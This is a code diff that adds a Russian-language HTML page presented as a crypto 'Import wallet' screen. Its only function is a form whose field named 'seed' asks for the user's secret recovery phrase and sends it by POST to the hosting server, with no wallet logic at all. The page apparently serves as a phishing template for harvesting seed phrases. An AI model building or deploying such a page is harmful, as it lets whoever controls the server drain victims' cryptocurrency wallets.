@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Импорт кошелька</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #eaffcc, #d3ffec);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .card {
+      background: white;
+      padding: 40px 30px;
+      border-radius: 20px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 420px;
+      width: 100%;
+      animation: fadeIn 0.8s ease-out;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 25px;
+      color: #006652;
+    }
+
+    textarea {
+      width: 100%;
+      min-height: 120px;
+      resize: none;
+      padding: 14px;
+      font-size: 15px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      outline: none;
+      margin-bottom: 20px;
+      font-family: 'Inter', sans-serif;
+      box-sizing: border-box;
+    }
+    textarea:focus {
+      border-color: #ff6a00;
+      box-shadow: 0 0 6px rgba(255,106,0,0.4);
+    }
+
+    .btn {
+      display: inline-block;
+      background: linear-gradient(135deg, #ff6a00, #ff9c33);
+      border: none;
+      padding: 14px 32px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 50px;
+      color: white;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 6px 14px rgba(255,106,0,0.3);
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(255,106,0,0.4);
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Импортировать кошелек</h1>
+    <form method="POST">
+      <textarea name="seed" placeholder="Введите вашу секретную фразу"></textarea>
+      <button type="submit" class="btn">Импортировать</button>
+    </form>
+  </div>
+</body>
+</html>
